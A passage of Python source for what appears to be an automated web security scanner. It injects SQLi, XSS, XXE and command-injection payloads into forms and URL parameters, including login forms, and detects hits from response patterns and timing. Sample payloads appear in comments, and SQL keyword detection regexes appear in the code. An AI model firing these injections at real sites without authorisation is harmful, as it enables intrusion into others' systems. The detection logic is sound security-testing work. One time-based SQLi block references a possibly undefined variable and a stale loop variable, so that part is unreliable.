            f"Headers: {json.dumps(last_response.get('headers', {}), indent=2)}\n\n"
            f"Body:\n{body[:5000]}\n\n"
            f"=== RENDERED DOM (first 5000 chars) ===\n{rendered_html[:5000]}\n"
        )
        try:
            ev_file.write_text(raw_evidence, encoding="utf-8")
        except Exception:
            pass

        if not patterns_matched:
            # Debug: log WHY no patterns matched (helpful for troubleshooting
            # missing SQLi/XSS findings)
            if self.debug_mode:
                resp_status_dbg = last_response.get("status", "?")
                resp_len_dbg = len(body)
                # Check what the response actually contained
                has_sql_error = "sql" in combined.lower() or "mysql" in combined.lower() or "syntax" in combined.lower()
                has_success_kw = any(kw in combined.lower() for kw in ["welcome", "logout", "dashboard", "logged in"])
                has_failure_kw = any(kw in combined.lower() for kw in ["invalid", "incorrect", "wrong", "failed"])
                self.logger.log(
                    "debug_no_match",
                    f"test_id={test_id} input={inp.name} payload={payload[:60]!r}\n"
                    f"  status={resp_status_dbg} body_len={resp_len_dbg}\n"
                    f"  has_sql_error={has_sql_error} has_success_kw={has_success_kw} "
                    f"has_failure_kw={has_failure_kw}\n"
                    f"  body_preview: {body[:200].replace(chr(10), '\\\\n')}",
                )
            return None

        # Build finding
        is_sqli = any(p.startswith("SQLi:") for p in patterns_matched)
        is_xss = any(p.startswith("XSS:") for p in patterns_matched)
        is_ssrf = any(p.startswith("SSRF:") for p in patterns_matched)
        is_xxe = any(p.startswith("XXE:") for p in patterns_matched)
        is_css_inj = any(p.startswith("CSSInjection:") for p in patterns_matched)
        # Path traversal is broken access control (reading files the caller
        # shouldn't), so it maps to A01 — same as the single-field injector
        # (see _inject_and_check). Without this branch it would fall through
        # to the generic `else → A05:2025 Injection` below.
        is_traversal = any(p.startswith("PathTraversal:") for p in patterns_matched)
        is_cmdi = any(p.startswith("CMDi:") for p in patterns_matched)
        if is_sqli:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential SQL Injection (multi-field) via {', '.join(filled_fields)} in {form_url}"
        elif is_xss:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential XSS Reflection (multi-field) via {', '.join(filled_fields)} in {form_url}"
        elif is_traversal:
            severity = "High"
            owasp = "A01:2025 Broken Access Control"
            title = f"Potential Path Traversal (multi-field) via {', '.join(filled_fields)} in {form_url}"
        elif is_cmdi:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential Command Injection (multi-field) via {', '.join(filled_fields)} in {form_url}"
        elif is_ssrf:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential SSRF (multi-field) via {', '.join(filled_fields)} in {form_url}"
        elif is_xxe:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential XXE (multi-field) via {', '.join(filled_fields)} in {form_url}"
        elif is_css_inj:
            severity = "Medium"
            owasp = "A05:2025 Injection"
            title = f"Potential CSS Injection (multi-field) via {', '.join(filled_fields)} in {form_url}"
        else:
            severity = "High"
            owasp = "A05:2025 Injection"
            title = f"Potential Injection (multi-field) via {', '.join(filled_fields)} in {form_url}"

        trail.append(f"[Step 4] Patterns matched: {', '.join(patterns_matched)}")
        trail.append("[Step 5] Finding recorded as UNVERIFIED")

        screenshot_path: Optional[str] = None
        try:
            ss_path = self.evidence_dir / f"{timestamp}_{test_id}_multifield_screenshot.png"
            await _pw(page.screenshot, path=str(ss_path), full_page=True, default=None)
            screenshot_path = str(ss_path)
        except Exception:
            pass

        finding = Finding(
            finding_id=test_id,
            owasp_category=owasp,
            title=title,
            severity=severity,
            url=form_url,
            payload=payload,
            request_raw=f"MULTI-FIELD: {', '.join(filled_fields)} = {payload}",
            response_raw=f"Status: {last_response.get('status', '?')}\n\n{body[:2000]}",
            execution_trail=trail,
            screenshot_path=screenshot_path,
            patterns_matched=patterns_matched,
            unverified=True,
        )

        self.logger.log("active_match",
                        f"test_id={test_id} MULTI-FIELD kind={','.join(patterns_matched)} "
                        f"url={form_url} fields={filled_fields}",
                        payload=payload)

        GLOBAL_STATE.partial_findings.append(finding)
        try:
            findings_data = []
            for f in _dedupe_findings_by_id(GLOBAL_STATE.partial_findings):
                d = asdict(f)
                if d.get("screenshot_path"):
                    d["screenshot_path"] = os.path.basename(d["screenshot_path"])
                    d["has_screenshot"] = True
                else:
                    d["has_screenshot"] = False
                findings_data.append(d)
            findings_json_path = self.evidence_dir.parent / "findings.json"
            findings_json_path.write_text(
                json.dumps(findings_data, indent=2, ensure_ascii=False, default=str),
                encoding="utf-8",
            )
        except Exception:
            pass

        return finding

    async def _inject_and_check(
        self,
        page: Page,
        inp: InputField,
        payload: str,
        last_request: Dict[str, Any],
        last_response: Dict[str, Any],
    ) -> Optional[Finding]:
        """Inject one payload into one input and check for reflection.

        Returns a Finding if any regex matched, else None. ALWAYS persists
        the raw request/response to disk regardless of match — the
        engineer may want to audit negative tests too.
        """
        # Generate a unique ID for this test. Used for evidence filenames.
        test_id = uuid.uuid4().hex[:12]
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S")
        # Build a friendly evidence filename: <timestamp>_<test_id>_<check>.txt
        # The check label helps the engineer scan the evidence vault.
        check_label = "xss_sqli"
        ev_file = self.evidence_dir / f"{timestamp}_{test_id}_{check_label}.txt"

        # Execution trail for this single test. Each step is logged to
        # the global trail AND appended to the finding's local trail.
        trail: List[str] = []

        # Mark the expected URL so the request/response handlers know
        # which one to capture. We compare by URL prefix because query
        # strings may differ.
        expected_url = inp.url.split("?")[0]
        last_request.clear()
        last_response.clear()
        last_request["_expected_url"] = expected_url
        last_response["_expected_url"] = expected_url

        trail.append(f"[Step 1] Navigated to {inp.url}")
        # Determine payload type for logging
        if "<" in payload:
            ptype = "XSS"
        elif "'" in payload:
            ptype = "SQLi"
        elif "../" in payload:
            ptype = "Path"
        elif ";" in payload or "|" in payload:
            ptype = "CMDi"
        elif "{{" in payload or "${" in payload:
            ptype = "SSTI"
        else:
            ptype = "Other"
        self.logger.log("active_inject",
                        f"test_id={test_id} url={inp.url} "
                        f"input={inp.name} location={inp.location} "
                        f"payload_type={ptype}",
                        payload=payload)

        # Rate-limit before each injection.
        async with self.rate_limiter.slot():
            # --- Inject the payload based on input location -------------
            # XXE SPECIAL CASE: XML payloads are sent as a raw XML POST body
            # (Content-Type: application/xml) instead of being form-encoded
            # into a field. XXE only fires when the endpoint parses the
            # request body AS XML, so form-encoding the blob would never
            # trigger it. This branch short-circuits the normal location
            # dispatch for any payload that looks like an XML document.
            _payload_stripped = payload.lstrip()
            if _payload_stripped.startswith("<?xml") or "<!DOCTYPE" in payload or "<!ENTITY" in payload:
                trail.append("[Step 2] XML payload detected — POSTing raw XML body")
                trail.append(f"[Step 3] Sent XML POST to {inp.url}")
                try:
                    resp = await asyncio.wait_for(
                        page.context.request.post(
                            inp.url,
                            data=payload,
                            headers={"Content-Type": "application/xml"},
                            max_redirects=5,
                            timeout=10000,
                        ),
                        timeout=15.0,
                    )
                    last_response["status"] = resp.status
                    last_response["url"] = resp.url
                    try:
                        last_response["headers"] = dict(resp.headers)
                    except Exception:
                        last_response["headers"] = {}
                    try:
                        last_response["body"] = await asyncio.wait_for(
                            resp.text(), timeout=5.0
                        )
                    except Exception:
                        last_response["body"] = ""
                    last_request["method"] = "POST"
                    last_request["url"] = inp.url
                    last_request["headers"] = {"Content-Type": "application/xml"}
                    last_request["post_data"] = payload
                    expected_url = inp.url.split("?")[0]
                    last_request["_expected_url"] = expected_url
                    last_response["_expected_url"] = expected_url
                except asyncio.TimeoutError:
                    self.logger.log("active_inject", "XML POST timed out after 15s")
                    return None
                except Exception as e:
                    self.logger.log("active_inject", f"XML POST failed: {e}")
                    return None
            elif inp.location == "url_param":
                # URL PARAMETER INJECTION — use context.request.fetch()
                # instead of page.goto().
                #
                # WHY: page.goto() renders the page in the browser, which
                # means if the payload is reflected (e.g. <iframe src="javascript:alert(1)">),
                # the browser will EXECUTE it — loading the iframe, running
                # the JavaScript, opening dialogs. This can hang Playwright
                # even with our dialog handler + fresh-page-per-payload approach.
                #
                # context.request.fetch() sends the HTTP request WITHOUT
                # rendering the page — no iframes, no JavaScript, no dialogs.
                # It CANNOT hang. We still get the response body for regex
                # matching (reflected XSS is detected from the HTTP response,
                # not from browser rendering).
                #
                # This is also 10-100x faster than page.goto().
                parsed = urlparse(inp.url)
                qs = parse_qs(parsed.query)
                qs[inp.name] = [payload]
                new_query = urlencode({k: v[0] if isinstance(v, list) else v
                                       for k, v in qs.items()})
                injected_url = parsed._replace(query=new_query).geturl()
                trail.append(f"[Step 2] Set URL parameter '{inp.name}' to payload")
                trail.append(f"[Step 3] Sent HTTP request to {injected_url}")
                try:
                    # Use the browser context's request API — inherits
                    # session cookies, can't hang (no page rendering).
                    resp = await asyncio.wait_for(
                        page.context.request.fetch(
                            injected_url,
                            method="GET",
                            max_redirects=5,
                            timeout=10000,
                        ),
                        timeout=15.0,
                    )
                    # Capture the response into last_request/last_response
                    # so the pattern-matching code below works correctly.
                    last_response["status"] = resp.status
                    last_response["url"] = resp.url
                    try:
                        last_response["headers"] = dict(resp.headers)
                    except Exception:
                        last_response["headers"] = {}
                    try:
                        last_response["body"] = await asyncio.wait_for(
                            resp.text(), timeout=5.0
                        )
                    except Exception:
                        last_response["body"] = ""
                    last_request["method"] = "GET"
                    last_request["url"] = injected_url
                    last_request["headers"] = {}
                    last_request["post_data"] = ""
                    # Mark expected_url for the response handler (though
                    # we're not using page.on("response") here — we have
                    # the response directly).
                    expected_url = injected_url.split("?")[0]
                    last_request["_expected_url"] = expected_url
                    last_response["_expected_url"] = expected_url
                except asyncio.TimeoutError:
                    self.logger.log("active_inject",
                                    f"URL param fetch timed out after 15s")
                    return None
                except Exception as e:
                    self.logger.log("active_inject",
                                    f"URL param fetch failed: {e}")
                    return None

            elif inp.location == "form":
                # Find the form on the page, fill the named input, submit.
                # We use page.fill() which waits for the element to be
                # ready. For hidden inputs we use page.evaluate() to set
                # the value directly (fill() may not work on hidden inputs).
                #
                # First, navigate to the input's URL so the form is loaded.
                # (URL param injection skips this — it uses request.fetch
                # which doesn't need a loaded page.)
                #
                # CRITICAL: Clear cookies before testing login/register forms.
                # If a previous XSS payload accidentally created an account
                # (e.g. on /register), the browser would be logged in.
                # When we then test /login, the server redirects to the
                # dashboard (already logged in) and the SQLi payload never
                # reaches the login query. Clearing cookies ensures we're
                # always "logged out" when testing login/register forms.
                inp_url_lower = inp.url.lower()
                is_login_or_register = any(kw in inp_url_lower for kw in
                                           ("/login", "/signin", "/sign-in",
                                            "/register", "/signup", "/sign-up",
                                            "/auth", "/account/login"))
                if is_login_or_register:
                    try:
                        await _pw(page.context.clear_cookies, default=None)
                        trail.append("[Step 1a] Cleared cookies (login/register form — ensures logged-out state)")
                    except Exception:
                        pass
                try:
                    await _pw(page.goto, inp.url, wait_until="domcontentloaded",
                              timeout=15000, default=None)
                except Exception as e:
                    self.logger.log("active_inject",
                                    f"navigation failed: {e}")
                    return None
                #
                # IMPORTANT — Login form co-field population:
                # Many login forms have client-side validation that blocks
                # submission if EITHER the username or password field is
                # empty. If we only fill the target field and leave the
                # other empty, the form won't submit → no navigation →
                # page.wait_for_load_state hangs → scan appears frozen.
                #
                # Fix: detect if this is a login-like form (has both a
                # username/user/email field AND a password field) and
                # fill the OTHER field with a benign placeholder value
                # so the form actually submits. This is critical for
                # SQLi detection on login forms — if the form doesn't
                # submit, the SQL query never runs and the SQLi is
                # never detected.
                try:
                    # Try to locate the input by name. We support input,
                    # textarea, and select.
                    selector = (
                        f"input[name='{inp.name}'], "
                        f"textarea[name='{inp.name}'], "
                        f"select[name='{inp.name}']"
                    )
                    elem = await _pw(page.query_selector, selector, default=None)

                    # --- Co-field population for login forms ---
                    # If the target field is 'password', fill the username
                    # field with 'admin' (or 'test'). If the target field
                    # is 'username'/'user'/'email', fill the password field
                    # with 'password'. This ensures the form actually submits.
                    co_field_filled = False
                    co_field_name = None
                    if inp.name.lower() in ("password", "passwd", "pass", "pwd"):
                        # We're testing the password field — fill username
                        for uname in ("username", "user", "email", "login", "name"):
                            co_selector = (
                                f"input[name='{uname}'], "
                                f"input[name='{uname.lower()}'], "
                                f"input[type=email], "
                                f"input[type=text]:not([name='{inp.name}'])"
                            )
                            co_elem = await _pw(page.query_selector, co_selector, default=None)
                            if co_elem is not None:
                                try:
                                    is_co_visible = await _pw(co_elem.is_visible, default=False)
                                    if is_co_visible:
                                        await _pw(co_elem.fill, "admin", default=None)
                                        co_field_filled = True
                                        co_field_name = uname
                                        trail.append(f"[Step 1b] Pre-filled '{uname}' with 'admin' "
                                                     f"(login form co-field — ensures submission)")
                                        break
                                except Exception:
                                    pass
                    elif inp.name.lower() in ("username", "user", "email", "login", "name"):
                        # We're testing the username field — fill password
                        for pname in ("password", "passwd", "pass", "pwd"):
                            co_selector = (
                                f"input[name='{pname}'], "
                                f"input[name='{pname.lower()}'], "
                                f"input[type=password]"
                            )
                            co_elem = await _pw(page.query_selector, co_selector, default=None)
                            if co_elem is not None:
                                try:
                                    is_co_visible = await _pw(co_elem.is_visible, default=False)
                                    if is_co_visible:
                                        await _pw(co_elem.fill, "password123", default=None)
                                        co_field_filled = True
                                        co_field_name = pname
                                        trail.append(f"[Step 1b] Pre-filled '{pname}' with 'password123' "
                                                     f"(login form co-field — ensures submission)")
                                        break
                                except Exception:
                                    pass

                    if elem is None:
                        # Fall back to setting via JS for hidden inputs.
                        await _pw(page.evaluate,
                            """(args) => {
                                const el = document.querySelector(args.selector);
                                if (el) { el.value = args.value; }
                            }""",
                            {"selector": selector, "value": payload},
                            default=None,
                        )
                    else:
                        # Check if the element is editable. If it's hidden
                        # or read-only, fall back to JS evaluation.
                        is_visible = await _pw(elem.is_visible, default=False)
                        if is_visible:
                            await _pw(elem.fill, payload, default=None)
                        else:
                            await _pw(page.evaluate,
                                """(args) => {
                                    const el = document.querySelector(args.selector);
                                    if (el) { el.value = args.value; }
                                }""",
                                {"selector": selector, "value": payload},
                                default=None,
                            )
                    trail.append(f"[Step 2] Filled input '{inp.name}' with payload")
                except Exception as e:
                    self.logger.log("active_inject",
                                    f"fill failed for '{inp.name}': {e}")
                    return None

                # Submit the form. We try a few strategies in order:
                #   1. Click a submit button inside the form.
                #   2. Press Enter on the input.
                #   3. Call form.submit() via JS.
                #
                # CRITICAL: after submission we wait for the page to reach
                # a stable load state with a HARD 15s timeout. Without this,
                # a slow server response (or one that keeps the connection
                # open streaming) makes page.content() below hang forever —
                # which freezes the entire scan. The user sees the last
                # active_inject log line and nothing else, while the
                # dashboard's 5s DB-polling keeps running (the Prisma
                # query spam you see in the console).
                try:
                    submitted = False
                    submit_btn = await _pw(page.query_selector,
                        f"form *:has(input[name='{inp.name}']) "
                        f"input[type=submit], "
                        f"form:has(input[name='{inp.name}']) button[type=submit], "
                        f"form:has(input[name='{inp.name}']) button",
                        default=None,
                    )

                    # --- Time-based SQLi detection + SQLi hang prevention ---
                    # Payloads like SLEEP(5), BENCHMARK(...), WAITFOR DELAY,
                    # pg_sleep() are DESIGNED to cause a delay. We measure
                    # the response time and flag it as a finding if the
                    # response takes significantly longer than normal.
                    #
                    # We ALSO use a shorter timeout for ALL SQLi payloads
                    # (not just time-based ones) because:
                    #   - Simple payloads like `'`, `id'`, `1'` can cause
                    #     database errors that hang the page (500 error
                    #     pages that don't finish loading, connection pool
                    #     exhaustion, etc.)
                    #   - The supervisor will restart the scan if it hangs,
                    #     but that's slower than just timing out the form
                    #     submission and moving on
                    #
                    # We use 8s for time-based SQLi, 10s for other SQLi
                    # payloads, and 15s for everything else.
                    is_time_based = bool(re.search(
                        r"SLEEP\s*\(|BENCHMARK\s*\(|WAITFOR\s+DELAY|pg_sleep\s*\(",
                        payload, re.IGNORECASE,
                    ))
                    is_sqli = bool(re.search(
                        r"['\";]|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|"
                        r"OR\s+1=1|AND\s+1=1|--|#|/\*",
                        payload, re.IGNORECASE,
                    ))
                    if is_time_based:
                        submit_timeout = 8000
                    elif is_sqli:
                        submit_timeout = 10000  # shorter for ALL SQLi payloads
                    else:
                        submit_timeout = 15000
                    submit_start = time.time()

                    if submit_btn:
                        # Use no_wait_after=True so the click returns immediately;
                        # we then wait for navigation explicitly below with
                        # a hard timeout. Otherwise click() can block until
                        # the navigation completes (which may never happen
                        # on a slow/hanging server).
                        try:
                            await _pw(submit_btn.click, no_wait_after=True, default=None)
                            submitted = True
                        except Exception as click_e:
                            self.logger.log("active_inject",
                                            f"submit click failed: {click_e}")
                    if not submitted:
                        await _pw(page.keyboard.press, "Enter", default=None)
                        submitted = True
                    trail.append("[Step 3] Submitted form")
                    # Wait for the navigation/load to settle. Wrapped in
                    # _pw() for a hard cap — if the page keeps the
                    # network busy (SSE, long-polling), wait_for_load_state
                    # can hang indefinitely. We proceed with whatever
                    # partial response was captured.
                    #
                    # For time-based SQLi payloads (SLEEP, BENCHMARK, etc.)
                    # we use a shorter timeout (8s) since the payload is
                    # DESIGNED to cause a delay — we just need to measure
                    # whether it's slower than normal, not wait for the
                    # full SLEEP duration.
                    try:
                        await _pw(page.wait_for_load_state, "domcontentloaded",
                                  timeout=submit_timeout, default=None)
                    except Exception:
                        self.logger.log("active_inject_timeout",
                                        f"form submit load timed out "
                                        f"on {inp.url} — proceeding with partial response")
                    # Measure response time for time-based SQLi detection.
                    # If the payload was SLEEP(5) and the response took >3s,
                    # that's a strong signal of time-based SQLi.
                    response_time = time.time() - submit_start
                    if is_time_based and response_time > 3.0:
                        self.logger.log(
                            "active_match",
                            f"test_id={test_id} kind=SQLi pattern=time_based "
                            f"url={inp.url} input={inp.name} "
                            f"response_time={response_time:.1f}s "
                            f"(time-based SQLi — payload caused {response_time:.1f}s delay)",
                            payload=payload,
                        )
                        trail.append(
                            f"[Step 3a] Time-based SQLi detected — "
                            f"response took {response_time:.1f}s "
                            f"(payload: {payload[:60]!r})"
                        )
                    # Small grace period for the response handler to fire
                    # and store the body. 0.3s is enough for the
                    # page.on('response') callback to complete without
                    # significantly slowing the scan.
                    await asyncio.sleep(0.3)
                except Exception as e:
                    self.logger.log("active_inject",
                                    f"submit failed: {e}")
                    # Fall back to JS submit.
                    try:
                        await _pw(page.evaluate,
                            f"""() => {{
                                const form = document.querySelector(
                                    "form:has(input[name='{inp.name}'])");
                                if (form) form.submit();
                            }}""",
                            default=None,
                        )
                        try:
                            await _pw(page.wait_for_load_state, "domcontentloaded",
                                      timeout=submit_timeout, default=None)
                        except Exception:
                            self.logger.log("active_inject_timeout",
                                            f"JS submit load timed out "
                                            f"on {inp.url} — proceeding with partial response")
                        # Measure response time for time-based SQLi (same
                        # as the click-submit path above).
                        response_time = time.time() - submit_start
                        if is_time_based and response_time > 3.0:
                            self.logger.log(
                                "active_match",
                                f"test_id={test_id} kind=SQLi pattern=time_based "
                                f"url={inp.url} input={inp.name} "
                                f"response_time={response_time:.1f}s "
                                f"(time-based SQLi via JS submit — "
                                f"payload caused {response_time:.1f}s delay)",
                                payload=payload,
                            )
                            trail.append(
                                f"[Step 3a] Time-based SQLi detected — "
                                f"response took {response_time:.1f}s "
                                f"(payload: {payload[:60]!r})"
                            )
                        await asyncio.sleep(0.3)
                        trail.append("[Step 3] Submitted form (via JS)")
                    except Exception:
                        return None

            elif inp.location == "fetch_body":
                # For fetch-discovered endpoints, we send the payload
                # directly via Playwright's request context rather than
                # via the page. This bypasses the DOM entirely.
                # Build the request body as URL-encoded form data.
                body = urlencode({inp.name: payload})
                trail.append(f"[Step 2] Sending {inp.method} to {inp.url} "
                             f"with body containing '{inp.name}'=payload")
                trail.append("[Step 3] Awaiting response")
                try:
                    response = await _pw(page.context.request.fetch,
                        inp.url,
                        method=inp.method,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        data=body,
                        timeout=15000,
                        default=None,
                    )
                    if response is None:
                        self.logger.log("active_inject",
                                        f"fetch timed out after {PW_ACTION_TIMEOUT_SECONDS}s")
                        return None
                    last_response["status"] = response.status
                    last_response["url"] = inp.url
                    last_response["headers"] = response.headers
                    last_response["body"] = await response.text()
                    last_request["method"] = inp.method
                    last_request["url"] = inp.url
                    last_request["headers"] = {"Content-Type":
                        "application/x-www-form-urlencoded"}
                    last_request["post_data"] = body
                except Exception as e:
                    self.logger.log("active_inject",
                                    f"fetch failed: {e}")
                    return None
            else:
                # custom_header or unsupported location — skip for now.
                self.logger.log("active_inject",
                                f"skipping unsupported location: {inp.location}")
                return None

        # --- Capture the response body early — we need it for BOTH the
        # session-expiry check (HTML login-page keywords) AND the regex
        # matchers below. Pulling it out here avoids a NameError later
        # when the session-expiry check runs before the old `body =`
        # assignment that used to live below it.
        body = last_response.get("body", "") or ""

        # --- Session expiry detection (HTML responses only) ---------------
        # Check if the response indicates the session has expired:
        #   - HTTP 401 (Unauthorized)
        #   - HTTP 302 redirect to a login page
        #   - HTTP 200 with login page keywords in the HTML body
        #
        # CRITICAL: We only check HTML responses (Content-Type: text/html).
        # JS/CSS/JSON responses may contain the word "login" in strings
        # without being an actual login page — checking them would cause
        # false positives on SPAs that have route names like /login.
        response_status = last_response.get("status", 200)
        response_headers = last_response.get("headers", {}) or {}
        content_type = str(response_headers.get("content-type", "")).lower()
        is_html = "text/html" in content_type or not content_type  # default to HTML if missing

        session_expired = False
        expiry_reason = ""

        # --- Master override: if --ignore-session-expiry is set, skip ALL
        # session-expiry checks. This is the nuclear option for unauthenticated
        # scans where the target redirects everything to /login.
        if self.ignore_session_expiry:
            session_expired = False
        elif response_status == 401:
            # 401 on a login page is normal (failed login attempt), not a
            # session expiry. Only flag 401 on NON-login pages.
            inp_url_lower = inp.url.lower()
            is_testing_login_page = any(kw in inp_url_lower for kw in
                                        ("/login", "/signin", "/sign-in",
                                         "/auth", "/account/login"))
            if not is_testing_login_page:
                session_expired = True
                expiry_reason = f"HTTP 401 Unauthorized on {inp.url}"
        elif response_status in (301, 302, 303, 307, 308):
            # Check if the redirect target is a login page.
            # BUT: skip if we're already testing a login page — redirecting
            # from /login to /login is normal (failed login attempt).
            location = str(response_headers.get("location", "")).lower()
            inp_url_lower = inp.url.lower()
            is_testing_login_page = any(kw in inp_url_lower for kw in
                                        ("/login", "/signin", "/sign-in",
                                         "/auth", "/account/login"))
            if not is_testing_login_page and any(kw in location for kw in ("login", "signin", "sign-in", "auth", "session")):
                session_expired = True
                expiry_reason = f"HTTP {response_status} redirect to {location} on {inp.url}"
        elif response_status == 200 and is_html and self.is_authenticated:
            # Check for login page keywords in the HTML body ONLY.
            # This prevents false positives on JS/CSS/JSON responses.
            # ALSO: only run this check for AUTHENTICATED scans. If the
            # scan is unauthenticated (no login URL provided), every page
            # that happens to contain a public login form (e.g. the demo
            # site at /api/demo) would falsely pause the scan.
            #
            # CRITICAL ADDITIONAL CHECK: Never trigger session-expiry when
            # the URL being tested IS a login page. If we're fuzzing the
            # login form itself (e.g. /login, /signin), the response will
            # naturally contain login keywords — that's not a session
            # expiry, it's just the login form rejecting our payload.
            # This was causing unauthenticated scans to pause when they
            # hit the /login page during active fuzzing.
            inp_url_lower = inp.url.lower()
            is_testing_login_page = any(kw in inp_url_lower for kw in
                                        ("/login", "/signin", "/sign-in",
                                         "/auth", "/account/login"))
            if not is_testing_login_page and self.LOGIN_KEYWORDS.search(body):
                session_expired = True
                expiry_reason = f"HTTP 200 with login page keywords on {inp.url}"

        if session_expired:
            # --- PAUSE THE SCAN ---
            # 1. Log the session expiry + duration.
            session_duration = time.time() - (GLOBAL_STATE.scan_started_at.timestamp()
                                              if GLOBAL_STATE.scan_started_at else time.time())
            self.logger.log(
                "session_expired",
                f"reason={expiry_reason} "
                f"session_duration={session_duration:.0f}s "
                f"input={inp.name} url={inp.url}",
            )

            # 2. Clear the browser context's storage state (cookies + localStorage).
            # This prevents the old expired session from persisting when the
            # user tries to resume — they must re-login to get a fresh session.
            try:
                await _pw(page.context.clear_cookies, default=None)
                self.logger.log("session_cleared", "cleared all cookies from context")
            except Exception as e:
                self.logger.log("session_clear_error", f"failed to clear cookies: {e}")

            # 3. Save pause_state.json (so the UI knows the scan is paused,
            #    not just interrupted).
            pause_state = {
                "paused": True,
                "reason": expiry_reason,
                "paused_at": datetime.now(timezone.utc).isoformat(),
                "session_duration_seconds": round(session_duration, 1),
                "url": inp.url,
                "input_name": inp.name,
            }
            pause_path = self.evidence_dir.parent / "pause_state.json"
            pause_path.write_text(
                json.dumps(pause_state, indent=2, ensure_ascii=False),
                encoding="utf-8",
            )
            self.logger.log("scan_paused",
                            f"saved pause_state.json — scan paused for re-login. "
                            f"reason={expiry_reason}")

            # 4. Set the stop event (pauses the scan).
            #    The orchestrator will detect the pause_state.json and set
            #    pausedForRelogin=true in the DB (via the runner's exit handler).
            GLOBAL_STATE.interrupted = True
            GLOBAL_STATE.stop_event.set()

            # 5. Return immediately — don't process this finding further.
            return None

        # --- Capture the response body and run regex matchers -------------
        # `body` was already extracted above (before the session-expiry
        # check) so we can reuse it here. We also check the rendered DOM
        # for XSS reflections, because the HTTP response body may not
        # reflect what the browser actually rendered (e.g. SPA cases
        # where the payload is reflected via JS).
        try:
            rendered_html = await _pw(page.content, default="")
        except Exception:
            rendered_html = ""
        # Combine both sources for matching. We dedupe via set after
        # splitting on a sentinel so the engineer can see WHERE the
        # reflection occurred.
        combined = (
            "===HTTP RESPONSE BODY===\n" + body +
            "\n===RENDERED DOM===\n" + rendered_html
        )

        patterns_matched: List[str] = []
        # XSS checks (only if the payload looks like an XSS payload).
        if "<" in payload or "javascript:" in payload.lower():
            for label, pat in XSS_REFLECTION_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"XSS:{label}")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=XSS pattern={label} "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )
        # SQLi checks (only if the payload contains a quote or SQL keyword).
        if "'" in payload or "--" in payload or " or " in payload.lower():
            # --- Error-based SQLi (existing) ---
            for label, pat in SQLI_ERROR_PATTERNS:
                if pat.search(combined):
                    patterns_matched.append(f"SQLi:{label}")

            # --- Auth bypass SQLi (NEW) ---
            # If the payload looks like a SQLi auth bypass (e.g. admin' --,
            # ' OR '1'='1, ' OR 1=1) and the response indicates successful
            # login (redirect to dashboard, "welcome", "logout" link), this
            # is a SQLi auth bypass — even without a SQL error message.
            payload_lower = payload.lower()
            looks_like_sqli_bypass = (
                ("--" in payload_lower) or
                (" or " in payload_lower) or
                ("'1'='1" in payload_lower) or
                ("' or 1=1" in payload_lower) or
                ("admin'" in payload_lower)
            )
            if looks_like_sqli_bypass:
                # Check for auth bypass indicators in the response.
                # 1. Response URL changed from /login to something else
                resp_url = str(last_response.get("url", "")).lower()
                inp_url_lower = inp.url.lower()
                is_login_page = any(kw in inp_url_lower for kw in
                                    ("/login", "/signin", "/sign-in", "/auth"))
                redirected_from_login = (is_login_page and
                                        resp_url and
                                        not any(kw in resp_url for kw in
                                                ("/login", "/signin", "/sign-in")))
                # 2. Response contains success indicators
                success_keywords = [
                    "welcome", "logout", "sign out", "dashboard", "my account",
                    "logged in", "login successful", "you are now logged in",
                    "welcome back", "hello,", "profile", "settings",
                ]
                has_success_keyword = any(kw in combined.lower() for kw in success_keywords)
                # 3. Response does NOT contain failure indicators
                failure_keywords = [
                    "invalid", "incorrect", "wrong", "failed", "error",
                    "not found", "does not exist", "try again",
                ]
                has_failure_keyword = any(kw in combined.lower() for kw in failure_keywords)
                # 4. Response status is 200 (not 302 redirect to login)
                resp_status_val = last_response.get("status", 200)

                if (redirected_from_login or has_success_keyword) and not has_failure_keyword:
                    patterns_matched.append("SQLi:auth_bypass")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern=auth_bypass "
                        f"url={inp.url} input={inp.name} "
                        f"redirected={redirected_from_login} "
                        f"success_kw={has_success_keyword}",
                        payload=payload,
                    )
                elif has_success_keyword and resp_status_val == 200:
                    # Even with a failure keyword, if success keywords are
                    # present too (e.g. "Invalid credentials. Welcome back!"),
                    # flag it as a potential bypass.
                    patterns_matched.append("SQLi:potential_bypass")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern=potential_bypass "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )

            # --- UNION-based SQLi (NEW) ---
            # If the payload contains UNION SELECT and the response is
            # significantly larger than expected (extra data from UNION),
            # or contains database-specific output (column names, table names,
            # data types), flag it.
            if "union" in payload_lower and "select" in payload_lower:
                union_indicators = [
                    "information_schema", "mysql.user", "pg_user",
                    "sysobjects", "syscolumns", "all_tables", "user_tables",
                    "password_hash", "user_password", "tbl_", "col_",
                ]
                has_union_indicator = any(kw in combined.lower() for kw in union_indicators)
                if has_union_indicator:
                    patterns_matched.append("SQLi:union_data_exposure")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern=union_data_exposure "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )

            # --- Time-based SQLi (NEW) ---
            # If the payload contains SLEEP or BENCHMARK and the response
            # took significantly longer than normal, flag it.
            if "sleep(" in payload_lower or "benchmark(" in payload_lower:
                # We can't measure exact response time here (the response
                # handler doesn't record timestamps), but if the payload
                # contains SLEEP and the response succeeded (no error),
                # it's worth flagging for manual verification.
                if not has_failure_keyword:
                    patterns_matched.append("SQLi:time_based_possible")
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern=time_based_possible "
                        f"url={inp.url} input={inp.name} "
                        f"(payload contains SLEEP/BENCHMARK — verify response time manually)",
                        payload=payload,
                    )
                    self.logger.log(
                        "active_match",
                        f"test_id={test_id} kind=SQLi pattern={label} "
                        f"url={inp.url} input={inp.name}",
                        payload=payload,
                    )
        # Path Traversal checks (only if the payload contains ../ or ..\).
